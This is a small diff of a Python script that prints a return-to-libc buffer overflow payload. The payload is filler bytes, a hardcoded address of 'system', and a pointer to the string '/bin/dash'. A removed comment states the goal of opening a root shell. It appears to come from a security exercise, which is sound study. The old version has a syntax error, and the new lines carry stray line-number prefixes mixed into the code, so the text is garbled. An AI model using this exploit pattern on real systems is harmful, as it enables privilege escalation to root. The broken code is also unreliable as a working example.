@@ -1,11 +1,5 @@
 import sys
-from struct import pack
-
-#Need to run /bin/sh and open a root shell
-filler = b"D" * 22
-ret= 0x0804ef50.to_bytes(4, "little")#start of systemx
-dummy_ret = "f"*4
-arg= 0xbffefaa8.to_bytes(4, "little") #wherever shell code string is
-command = "/bin/dash"
-
-sys.stdout.buffer.write(filler + ret+ b"f"* + arg+ command)
+2	
+3	addr = 0x804fef0.to_bytes(4, "little") #system address
+4	addr2 = 0xfff6b998.to_bytes(4, "little") #shellcode string
+5	sys.stdout.buffer.write(b"A" * 22 + addr + b"f"*4 + addr2 + b"/bin/dash")
